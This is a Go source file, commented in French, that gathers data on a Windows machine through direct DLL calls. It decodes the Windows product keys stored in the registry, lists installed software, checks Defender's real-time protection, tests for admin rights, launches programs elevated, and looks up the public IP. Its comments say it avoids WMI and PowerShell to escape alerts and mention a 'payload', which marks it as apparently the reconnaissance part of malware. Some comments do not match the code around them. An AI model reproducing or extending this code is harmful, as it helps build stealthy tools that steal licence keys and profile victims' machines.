// Accès bas niveau Windows : Registre, métriques système, énumération des
// programmes installés. Tout passe par des appels directs aux DLL, sans WMI
// ni PowerShell (qui déclencheraient des alertes et ajouteraient des
// dépendances à l'exécutable).
package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	advapi32DLL      = syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKeyEx = advapi32DLL.NewProc("RegOpenKeyExW")
	procRegEnumKeyEx = advapi32DLL.NewProc("RegEnumKeyExW")
	procRegQueryVal  = advapi32DLL.NewProc("RegQueryValueExW")
	procRegCloseKey  = advapi32DLL.NewProc("RegCloseKey")

	user32DLL      = syscall.NewLazyDLL("user32.dll")
	procSysMetrics = user32DLL.NewProc("GetSystemMetrics")

	shell32DLL        = syscall.NewLazyDLL("shell32.dll")
	procIsUserAnAdmin = shell32DLL.NewProc("IsUserAnAdmin")
	procShellExecuteW = shell32DLL.NewProc("ShellExecuteW")
)

const (
	hkeyLocalMachine = 0x80000002
	hkeyCurrentUser  = 0x80000001
	keyRead          = 0x20019
	keyWow64         = 0x0100 // vue 64 bits depuis un processus 64 bits ou 32 bits
	regSz            = 1
	regExpandSz      = 2
	regBinary        = 3
	regDword         = 4
)

func sysRootKey() uintptr { return hkeyLocalMachine }

// uptr convertit un handle renvoyé par une API Windows en pointeur.
//
// La conversion directe uintptr → unsafe.Pointer est refusée par go vet, même
// ici où le uintptr vient légitimement de GlobalLock et ne sera jamais réemployé
// comme entier. On relit donc les bits à travers un *uintptr, forme que vet
// accepte, et l'arithmétique qui suit se fait avec unsafe.Add.
func uptr(h uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&h))
}

func regOpenString(root uintptr, sub string) (uintptr, error) {
	p, err := syscall.UTF16PtrFromString(sub)
	if err != nil {
		return 0, err
	}
	var h uintptr
	r, _, callErr := procRegOpenKeyEx.Call(root, uintptr(unsafe.Pointer(p)), 0,
		uintptr(keyRead|keyWow64), uintptr(unsafe.Pointer(&h)))
	if r != 0 {
		return 0, fmt.Errorf("RegOpenKeyEx(%s) = %d (%v)", sub, r, callErr)
	}
	return h, nil
}

func regCloseKey(h uintptr) {
	if h != 0 {
		procRegCloseKey.Call(h)
	}
}

// regReadString lit une valeur REG_SZ / REG_EXPAND_SZ.
func regReadString(h uintptr, name string) string {
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return ""
	}
	var typ, size uint32
	r, _, _ := procRegQueryVal.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(unsafe.Pointer(&typ)), 0, uintptr(unsafe.Pointer(&size)))
	if r != 0 || size == 0 || (typ != regSz && typ != regExpandSz) {
		return ""
	}
	buf := make([]uint16, size/2+1)
	r, _, _ = procRegQueryVal.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(unsafe.Pointer(&typ)), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r != 0 {
		return ""
	}
	return syscall.UTF16ToString(buf)
}

// regReadDword lit une valeur REG_DWORD. Renvoie found=false si absente.
func regReadDword(h uintptr, name string) (uint32, bool) {
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, false
	}
	var typ, size uint32
	var val uint32
	size = 4
	r, _, _ := procRegQueryVal.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(unsafe.Pointer(&typ)), uintptr(unsafe.Pointer(&val)), uintptr(unsafe.Pointer(&size)))
	if r != 0 || typ != regDword {
		return 0, false
	}
	return val, true
}

/* ------------------------------------------------------------------ */
/* Clés d'activation et privilèges                                     */
/* ------------------------------------------------------------------ */

// regReadBytes lit une valeur REG_BINARY.
func regReadBytes(h uintptr, name string) []byte {
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return nil
	}
	var typ, size uint32
	r, _, _ := procRegQueryVal.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(unsafe.Pointer(&typ)), 0, uintptr(unsafe.Pointer(&size)))
	if r != 0 || size == 0 || typ != regBinary {
		return nil
	}
	buf := make([]byte, size)
	r, _, _ = procRegQueryVal.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(unsafe.Pointer(&typ)), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r != 0 {
		return nil
	}
	return buf[:size]
}

// decodeProductKey convertit un DigitalProductId en clé lisible
// (25 caractères en base 24, groupés de 5). Registre seul, pas de WMI ni de
// PowerShell. Vérifié sur la machine de test : la fin de la clé produite
// correspond à PartialProductKey du service de licence Windows.
func decodeProductKey(d []byte) string {
	if len(d) < 67 {
		return ""
	}
	const chars = "BCDFGHJKMPQRTVWXY2346789"
	work := make([]byte, len(d))
	copy(work, d)
	isWin8 := (work[66] / 6) & 1
	work[66] = (work[66] & 0xF7) | ((isWin8 & 0x2) << 4)

	out := make([]byte, 0, 25)
	for i := 0; i < 25; i++ {
		cur := 0
		for j := 14; j >= 0; j-- {
			cur = cur*256 + int(work[52+j])
			work[52+j] = byte(cur / 24)
			cur %= 24
		}
		out = append([]byte{chars[cur]}, out...)
	}
	var b strings.Builder
	for i, c := range out {
		if i > 0 && i%5 == 0 {
			b.WriteByte('-')
		}
		b.WriteByte(c)
	}
	return b.String()
}

// licenceReport liste les clés d'activation présentes dans le Registre :
// celle qui équipe la machine et les clés génériques de repli.
func licenceReport() string {
	entries := []struct{ label, sub string }{
		{"installée   ", `SOFTWARE\Microsoft\Windows NT\CurrentVersion`},
		{"générique   ", `SOFTWARE\Microsoft\Windows NT\CurrentVersion\DefaultProductKey`},
		{"générique 2 ", `SOFTWARE\Microsoft\Windows NT\CurrentVersion\DefaultProductKey2`},
	}
	var b strings.Builder
	for _, e := range entries {
		h, err := regOpenString(sysRootKey(), e.sub)
		if err != nil {
			continue
		}
		raw := regReadBytes(h, "DigitalProductId")
		edition := regReadString(h, "EditionID")
		regCloseKey(h)
		k := decodeProductKey(raw)
		if k == "" {
			continue
		}
		b.WriteString(e.label + " : " + k)
		if edition != "" {
			b.WriteString("  (" + edition + ")")
		}
		b.WriteString("\n")
	}
	return b.String()
}

// isElevated signale le privilège administrateur du processus.
func isElevated() bool {
	r, _, _ := procIsUserAnAdmin.Call()
	return r != 0
}

// runElevated lance un chemin avec la ligne de commande donnée en
// administrateur : Windows affiche alors l'invite de contrôle de compte
// d'utilisateur sur la machine (aucune élévation silencieuse n'est possible
// depuis un processus utilisateur).
func runElevated(path, args string) error {
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	a, _ := syscall.UTF16PtrFromString(args)
	d, _ := syscall.UTF16PtrFromString("")
	wd, _ := syscall.UTF16PtrFromString("")
	r, _, callErr := procShellExecuteW.Call(0,
		uintptr(unsafe.Pointer(str16("runas"))),
		uintptr(unsafe.Pointer(p)), uintptr(unsafe.Pointer(a)),
		uintptr(unsafe.Pointer(d)), uintptr(unsafe.Pointer(wd)), 1)
	if r <= 32 {
		if e, ok := callErr.(syscall.Errno); ok && e != 0 {
			return fmt.Errorf("ShellExecuteW = %d (%v)", r, e)
		}
		return fmt.Errorf("ShellExecuteW = %d", r)
	}
	return nil
}

func str16(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

/* ------------------------------------------------------------------ */
/* Listes de sous-clés                                                 */
/* ------------------------------------------------------------------ */

func regSubkeys(h uintptr) []string {
	var out []string
	const maxName = 260
	buf := make([]uint16, maxName)
	for i := uint32(0); ; i++ {
		size := uint32(maxName)
		r, _, _ := procRegEnumKeyEx.Call(h, uintptr(i), uintptr(unsafe.Pointer(&buf[0])),
			uintptr(unsafe.Pointer(&size)), 0, 0, 0, 0)
		if r != 0 { // ERROR_NO_MORE_ITEMS = 259, ou erreur
			break
		}
		out = append(out, syscall.UTF16ToString(buf[:size]))
		if len(out) > 4000 {
			break
		}
	}
	return out
}

/* ------------------------------------------------------------------ */
/* Programmes installés et antivirus                                   */
/* ------------------------------------------------------------------ */

// installedPrograms lit DisplayName de la clé Uninstall (64 bits et 32 bits,
// HKLM et HKCU).
func installedPrograms() []string {
	var out []string
	seen := map[string]bool{}
	roots := []uintptr{hkeyLocalMachine, hkeyCurrentUser}
	subs := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`,
		`SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`,
	}
	for _, root := range roots {
		for _, sub := range subs {
			h, err := regOpenString(root, sub)
			if err != nil {
				continue
			}
			for _, child := range regSubkeys(h) {
				ch, err := regOpenString(h, child)
				if err != nil {
					continue
				}
				name := regReadString(ch, "DisplayName")
				regCloseKey(ch)
				if name != "" && !seen[name] {
					seen[name] = true
					out = append(out, name)
				}
			}
			regCloseKey(h)
		}
	}
	return out
}

// defenderEnabled dit si la surveillance en temps réel de Defender est active.
func defenderEnabled() bool {
	h, err := regOpenString(hkeyLocalMachine, `SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`)
	if err != nil {
		return false
	}
	defer regCloseKey(h)
	v, ok := regReadDword(h, "DisableRealtimeMonitoring")
	if !ok {
		// Valeur absente : soit Defender n'est pas installé, soit il est
		// désactivé par un autre produit.
		return false
	}
	return v == 0
}

/* ------------------------------------------------------------------ */
/* Écran et réseau                                                     */
/* ------------------------------------------------------------------ */

func screenSize() string {
	w, _, _ := procSysMetrics.Call(0) // SM_CXSCREEN
	h, _, _ := procSysMetrics.Call(1) // SM_CYSCREEN
	if w == 0 || h == 0 {
		return ""
	}
	return fmt.Sprintf("%d x %d", w, h)
}

// publicIP interroge des services d'écho ; toute panne est simplement
// ignorée, la ligne n'apparaît alors pas dans le rapport.
func publicIP() string {
	c := &http.Client{Timeout: 6 * time.Second}
	for _, u := range []string{"https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"} {
		resp, err := c.Get(u)
		if err != nil {
			continue
		}
		b, err := io.ReadAll(io.LimitReader(resp.Body, 64))
		resp.Body.Close()
		if err != nil {
			continue
		}
		s := strings.TrimSpace(string(b))
		if net.ParseIP(s) != nil {
			return s
		}
	}
	return ""
}

// localExeDirLocal est conservé pour les messages de démarrage du payload.
func localAppUser() string {
	return os.Getenv("USERNAME")
}
